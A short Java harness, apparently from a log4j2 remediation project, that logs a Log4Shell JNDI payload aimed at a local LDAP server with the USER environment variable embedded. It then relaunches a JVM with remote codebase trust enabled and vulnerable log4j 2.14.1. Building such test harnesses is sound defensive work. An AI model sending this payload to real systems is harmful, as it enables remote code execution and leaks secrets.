package my.app;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class MainWrapper {

    static final Logger log = LogManager.getLogger(Main.class);

    public static void main(String[] args) throws Exception {
        log.error("${jndi:ldap://127.0.0.1:1389/a/${env:USER}}");

        String cmd = "" +
                "java" +
                " -Dcom.sun.jndi.ldap.object.trustURLCodebase=true" +
                " -Dcom.sun.jndi.rmi.object.trustURLCodebase=true" +
                " -classpath /home/wajda/Projects/log4j2-jvmsec-remedy/target/classes" +
                ":/home/wajda/.m2/repository/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar" +
                ":/home/wajda/.m2/repository/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar" +
                " my.app.Main";

        Process p = Runtime
                .getRuntime()
                .exec(cmd);

        p.waitFor();
    }
}
